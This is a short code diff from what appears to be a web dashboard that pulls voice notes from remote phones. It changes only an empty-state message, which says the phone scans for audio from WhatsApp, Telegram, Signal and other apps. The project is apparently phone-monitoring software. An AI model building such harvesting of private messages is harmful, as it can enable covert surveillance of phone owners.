@@ -1177,7 +1177,7 @@ async function pollVoiceNotes() {
   const list = document.getElementById('voiceNotesList');
   let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
   if (!data || typeof data !== 'object') {
-    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    list.innerHTML = '<div class="label">No voice notes found on phone</div><div style="font-size:10px;color:var(--muted);margin-top:4px">The phone scans for short audio files from WhatsApp, Telegram, Messenger, Signal, and voice recorders. Requires the READ_MEDIA_AUDIO permission.</div>';
     return;
   }
   const batches = Object.values(data).sort((a, b) => (parseInt(b.ts_ms)||0) - (parseInt(a.ts_ms)||0));
